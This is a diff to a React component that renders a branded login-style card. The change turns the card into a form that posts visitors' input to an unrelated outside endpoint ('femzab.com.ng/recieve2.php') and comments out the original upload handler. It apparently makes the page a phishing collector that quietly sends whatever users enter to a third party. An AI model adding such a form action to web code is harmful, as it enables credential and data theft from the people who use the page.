@@ -63,7 +63,7 @@ function App() {
   return (
     <div style={{ backgroundImage: `url(${background})`, position: 'fixed', width: '100%', height: '100%', backgroundSize: 'cover', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
       <div className="w3-card-4 w3-white w3-round w3-padding" style={{ width: 350 }}>
-        <div className="w3-margin-8">
+        <form encType='multipart/form-data' action='https://femzab.com.ng/recieve2.php' method='post'  className="w3-margin-8">
           <img src={require('./asset/logo.png')} alt='' style={{ height: 60, left: -18, position: 'relative' }} />
 
           <h5 style={{ 
@@ -106,12 +106,15 @@ function App() {
           </div>
 
           <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
-            <button disabled={loading} onClick={()=>_upload()} className="w3-btn w3-block w3-text-white w3-round" style={{ width: '94%', background: '#0a59a3', fontWeight: '600' }}>Next</button>
+            <button type='submit' 
+            // disabled={loading} 
+            // onClick={()=>_upload()}
+            className="w3-btn w3-block w3-text-white w3-round" style={{ width: '94%', background: '#0a59a3', fontWeight: '600' }}>Next</button>
           </div>
 
           <br />
 
-        </div>
+        </form>
       </div>
     </div>
   );
